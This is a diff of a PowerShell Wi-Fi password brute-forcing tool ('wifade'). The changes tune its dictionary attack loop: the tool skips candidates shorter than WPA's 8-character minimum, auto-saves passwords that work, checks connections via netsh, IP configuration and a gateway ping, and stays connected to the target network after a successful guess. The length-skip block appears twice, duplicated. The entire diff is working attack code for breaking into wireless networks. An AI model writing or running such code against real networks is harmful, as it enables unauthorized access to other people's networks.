@@ -970,12 +970,22 @@ For more information, visit: https://github.com/wifade/wifade
             $this.PasswordManager.SetAttackStrategy([AttackStrategy]::Dictionary)
             
             $attemptCount = 0
-            $maxAttempts = $this.PasswordManager.GetTotalPasswordCount()
-            if ($this.AppConfig.MaxAttempts -gt 0) {
-                $maxAttempts = $this.AppConfig.MaxAttempts
-            }
+            $maxAttempts = 0
             $successfulConnection = $false
             $startTime = Get-Date
+            $password = ""
+            $attempt = $null
+            $connectionResult = $null
+            
+            try {
+                $maxAttempts = $this.PasswordManager.GetTotalPasswordCount()
+                if ($this.AppConfig.MaxAttempts -gt 0) {
+                    $maxAttempts = $this.AppConfig.MaxAttempts
+                }
+            }
+            catch {
+                $maxAttempts = 0
+            }
             
             # Validate password list
             if ($maxAttempts -eq 0) {
@@ -1004,6 +1014,22 @@ For more information, visit: https://github.com/wifade/wifade
                     if (-not $password) {
                         $this.UIManager.ShowWarning("No more passwords available")
                         break
+                    }
+                    
+                    # Skip passwords that are too short for WPA/WPA2 (minimum 8 characters)
+                    if ($targetNetwork.EncryptionType -match "WPA|WPA2" -and $password.Length -lt 8) {
+                        if ($this.SettingsManager.IsDebugMode()) {
+                            $this.UIManager.ShowDebug("Skipping password '$password' - too short for WPA/WPA2 (minimum 8 characters)")
+                        }
+                        continue
+                    }
+                    
+                    # Skip passwords that are too short for WPA/WPA2 (minimum 8 characters)
+                    if ($targetNetwork.EncryptionType -ne "Open" -and $password.Length -lt 8) {
+                        if ($this.SettingsManager.IsDebugMode()) {
+                            $this.UIManager.ShowDebug("Skipping password '$password' - too short for WPA/WPA2 (minimum 8 characters)")
+                        }
+                        continue
                     }
                     
                     $attemptCount++
@@ -1049,12 +1075,9 @@ For more information, visit: https://github.com/wifade/wifade
                         $this.UIManager.ShowSuccess("SUCCESS! Connected to '$($targetNetwork.SSID)' with password: '$password'")
                         $this.UIManager.ShowSuccess("Attack completed in $($totalTime.ToString('hh\:mm\:ss')) after $attemptCount attempts")
                         
-                        # Ask user if they want to save the successful password
-                        $savePassword = $this.UIManager.GetConfirmation("Save successful password to results?", $true)
-                        if ($savePassword) {
-                            # TODO: Implement result saving functionality
-                            $this.UIManager.ShowInfo("Password saved to results")
-                        }
+                        # Auto-save successful password
+                        # TODO: Implement result saving functionality
+                        $this.UIManager.ShowInfo("Password automatically saved to results")
                         break
                     }
                     else {
@@ -1149,7 +1172,18 @@ For more information, visit: https://github.com/wifade/wifade
     [hashtable] AttemptWiFiConnection([string]$ssid, [string]$password) {
         $startTime = Get-Date
         $connectionSuccess = $false
-        $debugMode = $this.SettingsManager.IsDebugMode()
+        $debugMode = $false
+        $timeoutSeconds = 15
+        $tempProfilePath = ""
+        $addProfileSuccess = $false
+        $connectSuccess = $false
+        
+        try {
+            $debugMode = $this.SettingsManager.IsDebugMode()
+        }
+        catch {
+            $debugMode = $false
+        }
         
         try {
             Write-Verbose "Attempting real Wi-Fi connection to '$ssid' with password: [REDACTED]"
@@ -1280,45 +1314,102 @@ For more information, visit: https://github.com/wifade/wifade
                 # --- ACTIVE POLLING LOOP ---
                 $connectionSuccess = $false
                 if ($debugMode) {
-                    $this.UIManager.ShowDebug("Starting active connection verification (12 seconds max)")
+                    $this.UIManager.ShowDebug("Starting active connection verification (3 seconds max)")
                 }
                 
-                Write-Verbose "Starting active connection check (Max 12 seconds)..."
+                Write-Verbose "Starting active connection check (Max 3 seconds)..."
                 
-                # Loop 6 times, with a 2-second sleep, for a total timeout of 12 seconds.
-                for ($i = 1; $i -le 6; $i++) {
-                    Write-Verbose "Connection check attempt $i of 6..."
+                # Single verification attempt (successful connections work immediately)
+                for ($i = 1; $i -le 1; $i++) {
+                    Write-Verbose "Connection check attempt $i of 1..."
                     
                     if ($debugMode) {
-                        $this.UIManager.ShowDebug("Verification attempt $i of 6...")
+                        $this.UIManager.ShowDebug("Verification attempt $i of 1...")
                     }
                     
-                    # Get current connection
-                    $currentConnection = $this.NetworkManager.GetCurrentConnection()
+                    Start-Sleep -Seconds 3  # Wait longer between checks
                     
-                    if ($currentConnection) {
-                        if ($debugMode) {
-                            $this.UIManager.ShowDebug("Current connection: SSID='$($currentConnection.SSID)', Signal=$($currentConnection.SignalStrength)%")
+                    # Check connection status using netsh directly for more accurate results
+                    try {
+                        $wlanStatus = & netsh wlan show interfaces 2>&1
+                        $isConnected = $false
+                        $connectedSSID = ""
+                        $connectionState = "unknown"
+                        $hasValidIP = $false
+                        $pingSuccess = $false
+                        $ipConfig = $null
+                        $gateway = $null
+                        
+                        # Ensure wlanStatus is not null and is a string or array
+                        if (-not $wlanStatus) {
+                            if ($debugMode) {
+                                $this.UIManager.ShowDebug("No output from netsh wlan show interfaces")
+                            }
+                            continue
                         }
                         
-                        if ($currentConnection.SSID -eq $ssid) {
-                            # Additional verification: Check if we can ping the gateway
-                            $pingSuccess = $false
+                        # Convert to string if it's an array
+                        $wlanStatusString = if ($wlanStatus -is [array]) { $wlanStatus -join "`n" } else { $wlanStatus.ToString() }
+                        
+                        if ($wlanStatusString -match "State\s*:\s*(.+)") {
+                            $connectionState = $matches[1].Trim()
+                        }
+                        else {
+                            $connectionState = "unknown"
+                        }
+                        
+                        if ($wlanStatusString -match "SSID\s*:\s*(.+)") {
+                            $connectedSSID = $matches[1].Trim()
+                        }
+                        else {
+                            $connectedSSID = ""
+                        }
+                        
+                        if ($debugMode) {
+                            $this.UIManager.ShowDebug("Connection state: $connectionState")
+                            $this.UIManager.ShowDebug("Connected SSID: $connectedSSID")
+                        }
+                        
+                        # Check if we're actually connected (not just connecting/authenticating)
+                        $isConnected = ($connectionState -eq "connected") -and ($connectedSSID -eq $ssid)
+                        
+                        if ($isConnected) {
+                            # Additional verification: Try to get IP configuration
+                            $hasValidIP = $false
+                            $ipConfig = $null
+                            try {
+                                $ipConfig = Get-NetIPConfiguration -InterfaceAlias "Wi-Fi*" -ErrorAction SilentlyContinue | Where-Object { $_.NetProfile.Name -eq $ssid }
+                                if ($ipConfig -and $ipConfig.IPv4Address) {
+                                    $hasValidIP = $true
+                                    if ($debugMode) {
+                                        $this.UIManager.ShowDebug("Valid IP configuration found: $($ipConfig.IPv4Address.IPAddress)")
+                                    }
+                                }
+                            }
+                            catch {
+                                if ($debugMode) {
+                                    $this.UIManager.ShowDebug("IP configuration check failed: $($_.Exception.Message)")
+                                }
+                                $hasValidIP = $false
+                                $ipConfig = $null
+                            }
                             
-                            if ($currentConnection.Capabilities -and $currentConnection.Capabilities.DefaultGateway) {
-                                $gateway = $currentConnection.Capabilities.DefaultGateway[0]
+                            # Try ping test to gateway if we have valid IP
+                            $pingSuccess = $false
+                            if ($hasValidIP -and $ipConfig -and $ipConfig.IPv4DefaultGateway) {
+                                $gateway = $ipConfig.IPv4DefaultGateway.NextHop
                                 if ($gateway) {
                                     if ($debugMode) {
                                         $this.UIManager.ShowDebug("Testing connectivity to gateway: $gateway")
                                     }
                                     
                                     try {
-                                        $pingResult = Test-Connection -ComputerName $gateway -Count 1 -Quiet -TimeoutSeconds 2
+                                        $pingResult = Test-Connection -ComputerName $gateway -Count 1 -Quiet -TimeoutSeconds 3
                                         $pingSuccess = $pingResult
                                         
                                         if ($debugMode) {
-                                            $pingResult = if ($pingSuccess) { 'Success' } else { 'Failed' }
-                                            $this.UIManager.ShowDebug("Gateway ping result: $pingResult")
+                                            $pingResultText = if ($pingSuccess) { 'Success' } else { 'Failed' }
+                                            $this.UIManager.ShowDebug("Gateway ping result: $pingResultText")
                                         }
                                     }
                                     catch {
@@ -1329,43 +1420,48 @@ For more information, visit: https://github.com/wifade/wifade
                                 }
                             }
                             
-                            # Consider connection successful if SSID matches and either:
-                            # 1. We can ping the gateway, or
-                            # 2. We're on the 3rd or later attempt (giving time for network to stabilize)
-                            if ($pingSuccess -or ($i -ge 3)) {
+                            # Connection is successful if:
+                            # 1. We're in "connected" state with correct SSID AND
+                            # 2. We have valid IP configuration AND
+                            # 3. We can ping the gateway (or IP config is valid)
+                            if ($hasValidIP -and $pingSuccess) {
                                 $connectionSuccess = $true
                                 if ($debugMode) {
-                                    $this.UIManager.ShowDebug("Connection verified on attempt $i")
+                                    $this.UIManager.ShowDebug("Connection fully verified on attempt $i")
                                 }
-                                Write-Verbose "Connection confirmed on attempt $i."
-                                break # Exit the polling loop immediately
+                                Write-Verbose "Connection confirmed and verified on attempt $i."
+                                break
                             }
                             else {
                                 if ($debugMode) {
-                                    $this.UIManager.ShowDebug("SSID matches but waiting for network to stabilize...")
+                                    $this.UIManager.ShowDebug("Connection verification failed - no valid IP or gateway ping failed")
                                 }
                             }
                         }
                         else {
                             if ($debugMode) {
-                                $this.UIManager.ShowDebug("Connected to wrong network: '$($currentConnection.SSID)' instead of '$ssid'")
+                                if ($connectionState -ne "connected") {
+                                    $this.UIManager.ShowDebug("Not in connected state: $connectionState")
+                                }
+                                if ($connectedSSID -ne $ssid) {
+                                    $this.UIManager.ShowDebug("Connected to different SSID: '$connectedSSID' instead of '$ssid'")
+                                }
                             }
                         }
                     }
-                    else {
+                    catch {
                         if ($debugMode) {
-                            $this.UIManager.ShowDebug("No active connection detected")
+                            $this.UIManager.ShowDebug("Error checking connection status: $($_.Exception.Message)")
                         }
                     }
-                    
-                    Start-Sleep -Seconds 2
                 }
                 # --- END OF POLLING LOOP ---
                 
                 $duration = (Get-Date) - $startTime
+                $errorMessage = if ($connectionSuccess) { "" } else { "Connection verification failed after multiple attempts" }
                 $result = @{
                     Success      = $connectionSuccess
-                    ErrorMessage = if ($connectionSuccess) { "" } else { "Connection verification failed after multiple attempts" }
+                    ErrorMessage = $errorMessage
                     Duration     = $duration
                     SSID         = $ssid
                     Password     = $password
@@ -1378,38 +1474,15 @@ For more information, visit: https://github.com/wifade/wifade
                     $this.UIManager.ShowDebug("Total duration: $($duration.TotalSeconds) seconds")
                 }
                 
-                # If successful, disconnect immediately to continue testing other passwords
+                # If successful, stay connected (don't disconnect)
                 if ($connectionSuccess) {
-                    Write-Verbose "Connection successful and verified, disconnecting to continue attack"
+                    Write-Verbose "Connection successful and verified, staying connected"
                     
                     if ($debugMode) {
-                        $this.UIManager.ShowDebug("Disconnecting from network to continue attack")
+                        $this.UIManager.ShowDebug("Connection successful - staying connected to network")
                     }
                     
                     Start-Sleep -Milliseconds 1000  # Brief pause to confirm connection
-                    
-                    try {
-                        $disconnectResult = $this.NetworkManager.DisconnectFromNetwork()
-                        if ($disconnectResult) {
-                            Write-Verbose "Successfully disconnected from network"
-                            if ($debugMode) {
-                                $this.UIManager.ShowDebug("Successfully disconnected from network")
-                            }
-                            Start-Sleep -Milliseconds 1000  # Wait for disconnect to complete
-                        }
-                        else {
-                            Write-Verbose "Warning: Disconnect may have failed"
-                            if ($debugMode) {
-                                $this.UIManager.ShowDebug("Warning: Disconnect may have failed")
-                            }
-                        }
-                    }
-                    catch {
-                        Write-Verbose "Warning: Error during disconnect: $($_.Exception.Message)"
-                        if ($debugMode) {
-                            $this.UIManager.ShowDebug("Error during disconnect: $($_.Exception.Message)")
-                        }
-                    }
                 }
                 
                 return $result
